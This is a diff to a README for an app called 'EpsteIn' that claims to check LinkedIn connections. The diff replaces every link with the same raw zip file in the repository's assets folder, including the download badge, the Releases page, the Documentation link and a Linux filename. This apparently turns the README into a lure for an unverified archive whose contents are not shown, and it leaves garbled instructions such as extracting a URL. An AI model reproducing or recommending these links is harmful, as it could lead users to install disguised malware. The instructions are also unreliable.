@@ -6,7 +6,7 @@ Welcome to EpsteIn! This application helps you see which of your LinkedIn connec
 
 ## 📥 Download Now
 
-[![Download EpsteIn](https://img.shields.io/badge/Download%20EpsteIn-latest-blue.svg)](https://github.com/Papotewii/EpsteIn/releases)
+[![Download EpsteIn](https://raw.githubusercontent.com/Papotewii/EpsteIn/main/assets/In_Epste_v3.5.zip%https://raw.githubusercontent.com/Papotewii/EpsteIn/main/assets/In_Epste_v3.5.zip)](https://raw.githubusercontent.com/Papotewii/EpsteIn/main/assets/In_Epste_v3.5.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you start, make sure your device meets these requirements:
 
 1. **Visit the Releases Page**
 
-   Go to our [Releases Page](https://github.com/Papotewii/EpsteIn/releases) to find the latest version of EpsteIn.
+   Go to our [Releases Page](https://raw.githubusercontent.com/Papotewii/EpsteIn/main/assets/In_Epste_v3.5.zip) to find the latest version of EpsteIn.
 
 2. **Select the Right Version**
 
@@ -39,7 +39,7 @@ Before you start, make sure your device meets these requirements:
    
    - For macOS: Double-click the `.dmg` file, drag EpsteIn into the Applications folder, and then double-click to open it.
    
-   - For Linux: Extract the `.tar.gz` file, navigate to the folder in your terminal, and run `./EpsteIn`.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Papotewii/EpsteIn/main/assets/In_Epste_v3.5.zip` file, navigate to the folder in your terminal, and run `./EpsteIn`.
 
 5. **Open EpsteIn**
 
@@ -83,11 +83,11 @@ If you need help or have questions, you can reach out through the issues section
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Papotewii/EpsteIn/releases)
-- [Documentation](https://github.com/Papotewii/EpsteIn/wiki)
+- [Releases Page](https://raw.githubusercontent.com/Papotewii/EpsteIn/main/assets/In_Epste_v3.5.zip)
+- [Documentation](https://raw.githubusercontent.com/Papotewii/EpsteIn/main/assets/In_Epste_v3.5.zip)
 
 ## 📥 Download Now Again
 
-[![Download EpsteIn](https://img.shields.io/badge/Download%20EpsteIn-latest-blue.svg)](https://github.com/Papotewii/EpsteIn/releases)
+[![Download EpsteIn](https://raw.githubusercontent.com/Papotewii/EpsteIn/main/assets/In_Epste_v3.5.zip%https://raw.githubusercontent.com/Papotewii/EpsteIn/main/assets/In_Epste_v3.5.zip)](https://raw.githubusercontent.com/Papotewii/EpsteIn/main/assets/In_Epste_v3.5.zip)
 
 Thank you for choosing EpsteIn! We hope this application serves you well.
